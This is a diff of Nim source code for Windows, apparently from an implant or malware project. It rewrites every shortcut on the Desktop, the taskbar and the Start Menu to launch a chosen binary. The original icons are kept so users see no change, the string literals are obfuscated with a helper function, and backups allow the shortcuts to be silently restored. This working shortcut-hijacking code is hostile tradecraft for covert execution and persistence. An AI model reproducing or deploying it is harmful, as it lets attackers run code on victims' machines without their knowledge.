@@ -6,9 +6,8 @@
 
   - The user will get no response from attempting to open a program from a shortcut on the first attempt.
     The second attempt their intended program should open.
-
-  - The time window in which the intended program path is set depends on the reset time set in the config.toml,
-    or the hardcoded time in loader.nim.
+  
+  - The display of the shortcut/lnk file should not change.
 ]#
 
 import json
@@ -99,7 +98,7 @@ proc findIco(startPath: string): array[260, WCHAR] =
   - If an ico location is not found, the the ico path is set to the original target path to avoid the 
     shortcut/lnk file from changing appearence, as some lnks icons are set as the binary itself.
 ]#
-proc modifyLnk(target: string, launcherPath: string, backupList: var seq[LnkBackup]): void = 
+proc modifyLnk(target: string, binaryPath: string, backupList: var seq[LnkBackup]): void = 
   var
     ppv: LPVOID 
     ppvPF: LPVOID 
@@ -132,9 +131,9 @@ proc modifyLnk(target: string, launcherPath: string, backupList: var seq[LnkBack
   #if not psl.lpVtbl.SetIconLocation(psl, cast[LPCWSTR](wNewIco.addr), icoIdx).SUCCEEDED: return
 
   let originalPath = currentTarget.toString 
-  backupList.add(LnkBackup(originalPath: originalPath, modifiedPath: launcherPath, lnkPath: target))
+  backupList.add(LnkBackup(originalPath: originalPath, modifiedPath: binaryPath, lnkPath: target))
 
-  if not psl.lpVtbl.SetPath(psl, launcherPath.cstring).SUCCEEDED: return
+  if not psl.lpVtbl.SetPath(psl, binaryPath.cstring).SUCCEEDED: return
   if not ppf.lpVtbl.Save(ppf, target.cstring, TRUE).SUCCEEDED: return 
 
 # Target: shortcut file, gets restored to it's original path 
@@ -163,44 +162,41 @@ proc restoreLnk(target: string, originalPath: string): void =
   if not psl.lpVtbl.SetPath(psl, originalPath.cstring).SUCCEEDED: return 
   if not ppf.lpVtbl.Save(ppf, target.cstring, TRUE).SUCCEEDED: return
 
-proc modifyAllLnkPaths*(launcherPath: string, launcher: string): void =
+proc modifyAllLnkPaths*(binaryPath: string): void =
   var hres: HRESULT = CoInitialize(nil)
-  if hres != S_OK:
-    quit(QuitFailure)
   defer: CoUninitialize()
 
   var backupList: seq[LnkBackup] = @[]
   let 
-    launcherBin: string = joinPath(launcherPath, launcher)
     userProfile: string = jam("USERPROFILE")
     appData: string = jam("APPDATA")
 
   for entry in walkDir(getEnv(userProfile) / jam("Desktop")):
     let filePath = entry.path 
     if filePath.endsWith(jam(".lnk")):
-      modifyLnk(filePath, launcherBin, backupList)
+      modifyLnk(filePath, binaryPath, backupList)
   
   for entry in walkDir(jam("C:\\Users\\Public\\Desktop")):
     let filePath = entry.path 
     if filePath.endsWith(jam(".lnk")):
-      modifyLnk(filePath, launcherBin, backupList)
+      modifyLnk(filePath, binaryPath, backupList)
 
   for entry in walkDir(getEnv(appData) / jam("Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar")):
     let filePath = entry.path 
     if filePath.endsWith(jam(".lnk")):
-      modifyLnk(filePath, launcherBin, backupList)
+      modifyLnk(filePath, binaryPath, backupList)
   
-  for entry in walkDir(jam("C:\\ProgramData\\Microsoft\\Windows\\Start Menu")):
-    let filePath = entry.path 
-    if filePath.endsWith(jam(".lnk")):
-      modifyLnk(filePath, launcherBin, backupList)
+  for filePath in walkDirRec(jam("C:\\ProgramData\\Microsoft\\Windows\\Start Menu")):
+    let (parent, fileName) = splitPath(filePath)
+    if parent == jam("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"):
+      continue
+    if fileName.endsWith(jam(".lnk")):
+      modifyLnk(filePath, binaryPath, backupList)
 
   saveBackup(backupList)
 
 proc restoreOrigLnkPaths*(): void =
   var hres: HRESULT = CoInitialize(nil)
-  if hres != S_OK:
-    quit(QuitFailure)
   defer: CoUninitialize()
 
   let backups = loadBackupList()
@@ -229,9 +225,11 @@ proc restoreOrigLnkPaths*(): void =
         if filePath == backup.lnkPath:
           restoreLnk(filePath, backup.originalPath)
 
-  for entry in walkDir(jam("C:\\ProgramData\\Microsoft\\Windows\\Start Menu")):
-    let filePath = entry.path 
-    if filePath.endsWith(jam(".lnk")):
+  for filePath in walkDirRec(jam("C:\\ProgramData\\Microsoft\\Windows\\Start Menu")):
+    let (parent, fileName) = splitPath(filePath)
+    if parent == jam("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"):
+      continue
+    if fileName.endsWith(jam(".lnk")):
       for backup in backups:
         if filePath == backup.lnkPath:
           restoreLnk(filePath, backup.originalPath)
